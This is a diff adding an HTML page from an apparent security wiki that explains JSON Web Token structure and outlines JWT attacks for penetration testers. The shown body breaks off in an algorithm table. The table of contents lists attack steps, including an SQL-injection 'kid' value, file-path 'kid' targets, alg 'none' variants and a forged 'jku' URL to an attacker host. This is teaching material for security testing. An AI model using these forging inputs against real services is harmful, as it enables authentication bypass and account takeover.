@@ -1,0 +1,2291 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="JWT # Introduction to JSON Web Tokens (JWT) # JSON Web Token (JWT) is a compact, URL-safe token format used to securely transmit claims between a client and a server for authentication and authorization. A JWT consists of three Base64URL-encoded parts—the Header, Payload, and Signature—separated by dots (.). After successful authentication, the server issues a signed JWT, which the client includes in subsequent requests (typically in the Authorization: Bearer header).">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="JWT" />
+<meta property="og:description" content="JWT # Introduction to JSON Web Tokens (JWT) # JSON Web Token (JWT) is a compact, URL-safe token format used to securely transmit claims between a client and a server for authentication and authorization. A JWT consists of three Base64URL-encoded parts—the Header, Payload, and Signature—separated by dots (.). After successful authentication, the server issues a signed JWT, which the client includes in subsequent requests (typically in the Authorization: Bearer header)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/JWT/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>JWT | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class=" active">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>JWT</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#jwt">JWT</a>
+      <ul>
+        <li><a href="#introduction-to-json-web-tokens-jwt"><strong>Introduction to JSON Web Tokens (JWT)</strong></a>
+          <ul>
+            <li><a href="#jwt-structure--algorithms"><strong>JWT Structure &amp; Algorithms</strong></a></li>
+            <li><a href="#jwt-claims"><strong>JWT Claims</strong></a></li>
+            <li><a href="#jose-header-parameters"><strong>JOSE Header Parameters</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#common-jwt-vulnerabilities--attacks"><strong>Common JWT Vulnerabilities &amp; Attacks</strong></a>
+          <ul>
+            <li><a href="#1-signature-not-verified-decode-misuse"><strong>1. Signature Not Verified (<code>decode()</code> misuse)</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#tamper-role-claim-and-resend--no-re-signing-needed-if-server-skips-verification">Tamper role claim and resend — no re-signing needed if server skips verification</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#2-alg-none-acceptance"><strong>2. <code>alg: none</code> Acceptance</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#method-2-manual-build">Method 2: Manual build</a></li>
+    <li><a href="#note-the-trailing-dot--empty-signature">Note the trailing dot — empty signature</a></li>
+    <li><a href="#also-try-case-variants--weak-denylists-are-case-sensitive">Also try case variants — weak denylists are case-sensitive:</a></li>
+    <li><a href="#none-none-none">&ldquo;nOnE&rdquo;, &ldquo;None&rdquo;, &ldquo;NONE&rdquo;`</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#3-weak-hmac-secret"><strong>3. Weak HMAC Secret</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#dictionary-attack-fastest">Dictionary attack (fastest)</a></li>
+    <li><a href="#rule-based-catches-variations-like-secret1">Rule-based (catches variations like Secret1!)</a></li>
+    <li><a href="#brute-force-short-secrets">Brute-force short secrets</a></li>
+    <li><a href="#once-cracked--re-sign-with-jwt_tool">Once cracked — re-sign with jwt_tool</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#4-rsaecdsa--hmac-algorithm-confusion"><strong>4. RSA/ECDSA → HMAC Algorithm Confusion</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#or-extract-from-tls-cert">OR extract from TLS cert</a></li>
+    <li><a href="#step-2-if-no-jwks-exposed-recover-public-key-from-2-jwts">Step 2: If no JWKS exposed, recover public key from 2 JWTs</a></li>
+    <li><a href="#outputs-4-candidate-keys--try-all-4">Outputs 4 candidate keys — try all 4</a></li>
+    <li><a href="#step-3-burp-jwt-editor">Step 3: Burp JWT Editor</a></li>
+    <li><a href="#-import-rsa-public-key--attack--hmac-key-confusion-attack">→ Import RSA public key → Attack → HMAC Key Confusion Attack</a></li>
+    <li><a href="#step-4-jwt_tool">Step 4: jwt_tool</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#5-kid-injection"><strong>5. <code>kid</code> Injection</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#other-targets">Other targets:</a></li>
+    <li><a href="#procsyskernelrandomize_va_space">/proc/sys/kernel/randomize_va_space</a></li>
+    <li><a href="#etchostname-if-you-know-it">/etc/hostname (if you know it)`</a></li>
+    <li><a href="#inject-kidx-union-select-attacker_key--">Inject: {&ldquo;kid&rdquo;:&ldquo;x&rsquo; UNION SELECT &lsquo;attacker_key&rsquo;&ndash;&rdquo;}</a></li>
+    <li><a href="#then-sign-jwt-with-attacker_key-as-the-hs256-secret">Then sign JWT with &lsquo;attacker_key&rsquo; as the HS256 secret</a></li>
+    <li><a href="#fuzz-kid-with-jwt_tool">Fuzz kid with jwt_tool</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#6-jku--x5u-remote-key-fetch-abuse"><strong>6. <code>jku</code> / <code>x5u</code> Remote Key Fetch Abuse</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#step-2-build-jwksjson-and-host-it">Step 2: Build jwks.json and host it</a></li>
+    <li><a href="#keysktyrsausesigkidattacker-key-1nmoduluseaqab">{&ldquo;keys&rdquo;:[{&ldquo;kty&rdquo;:&ldquo;RSA&rdquo;,&ldquo;use&rdquo;:&ldquo;sig&rdquo;,&ldquo;kid&rdquo;:&ldquo;attacker-key-1&rdquo;,&ldquo;n&rdquo;:&quot;<modulus>&quot;,&ldquo;e&rdquo;:&ldquo;AQAB&rdquo;}]}</a></li>
+    <li><a href="#step-3-modified-jwt-header">Step 3: Modified JWT header</a></li>
+    <li><a href="#algrs256jkuhttpsyour-servercomjwksjsonkidattacker-key-1">{&ldquo;alg&rdquo;:&ldquo;RS256&rdquo;,&ldquo;jku&rdquo;:&ldquo;<a href="https://your-server.com/jwks.json%22,%22kid%22:%22attacker-key-1%22%7D">https://your-server.com/jwks.json&quot;,&quot;kid&quot;:&quot;attacker-key-1&quot;}</a></a></li>
+    <li><a href="#step-4-sign-with-jwt_tool">Step 4: Sign with jwt_tool</a></li>
+    <li><a href="#burp-shortcut">Burp shortcut:</a></li>
+    <li><a href="#jwt-editor--attack--embedded-jwk-hosts-jwks-automatically">JWT Editor → Attack → Embedded JWK (hosts JWKS automatically)</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#embedded-jwk-trust-cve-2018-0114-class">Embedded <code>jwk</code> Trust (CVE-2018-0114 class)**</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="jwt">
+  JWT
+  <a class="anchor" href="#jwt">#</a>
+</h1>
+<h2 id="introduction-to-json-web-tokens-jwt">
+  <strong>Introduction to JSON Web Tokens (JWT)</strong>
+  <a class="anchor" href="#introduction-to-json-web-tokens-jwt">#</a>
+</h2>
+<p><strong>JSON Web Token (JWT)</strong> is a compact, URL-safe token format used to securely transmit claims between a client and a server for authentication and authorization. A JWT consists of three Base64URL-encoded parts—the <strong>Header</strong>, <strong>Payload</strong>, and <strong>Signature</strong>—separated by dots (<code>.</code>). After successful authentication, the server issues a signed JWT, which the client includes in subsequent requests (typically in the <code>Authorization: Bearer</code> header). The server verifies the token&rsquo;s signature to ensure its integrity and authenticity before granting access to protected resources.</p>
+<p>In real assessments, testers usually find JWTs in:</p>
+<ul>
+<li><code>Authorization: Bearer &lt;token&gt;</code> headers</li>
+<li>Session cookies (<code>access_token</code>, <code>id_token</code>, <code>jwt</code>)</li>
+<li>SSO/OAuth redirect flows</li>
+<li>Mobile API traffic and GraphQL endpoints</li>
+</ul>
+<p>A JWT (usually JWS) has 3 parts:</p>
+<p><code>HEADER.PAYLOAD.SIGNATURE</code></p>
+<ul>
+<li><strong>HEADER</strong>: algorithm/key metadata (<code>alg</code>, <code>kid</code>, <code>jku</code>, etc.)</li>
+<li><strong>PAYLOAD</strong>: claims (<code>sub</code>, <code>role</code>, <code>iss</code>, <code>aud</code>, <code>exp</code>, &hellip;)</li>
+<li><strong>SIGNATURE</strong>: proof that token was signed by trusted key</li>
+</ul>
+<hr>
+<h3 id="jwt-structure--algorithms">
+  <strong>JWT Structure &amp; Algorithms</strong>
+  <a class="anchor" href="#jwt-structure--algorithms">#</a>
+</h3>
+<h4 id="jwt-format-jws-compact-serialization">
+  <strong>JWT Format (JWS Compact Serialization)</strong>
+  <a class="anchor" href="#jwt-format-jws-compact-serialization">#</a>
+</h4>
+<p>`eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</p>
+<p>Header  (alg, kid, jku&hellip;)
+Payload (sub, role, exp&hellip;)
+Signature`</p>
+<h4 id="supported-algorithms-jwa">
+  <strong>Supported Algorithms (JWA)</strong>
+  <a class="anchor" href="#supported-algorithms-jwa">#</a>
+</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Algorithm Type</strong></th>
+<th><strong>Algorithms</strong></th>
+<th><strong>Key Pentest Pointers</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Symmetric (HMAC)</strong></td>
+<td><code>HS256</code>, <code>HS384</code>, <code>HS512</code></td>
+<td>Most brute-force findings happen here (weak secret)</td>
+</tr>
+<tr>
+<td><strong>Asymmetric (RSA)</strong></td>
+<td><code>RS256</code>, <code>RS384</code>, <code>RS512</code></td>
+<td>Common target for RS→HS confusion checks</td>
+</tr>
+<tr>
+<td><strong>Asymmetric (ECDSA)</strong></td>
+<td><code>ES256</code>, <code>ES384</code>, <code>ES512</code></td>
+<td>Validate library/JDK patch level</td>
+</tr>
+<tr>
+<td><strong>RSASSA-PSS</strong></td>
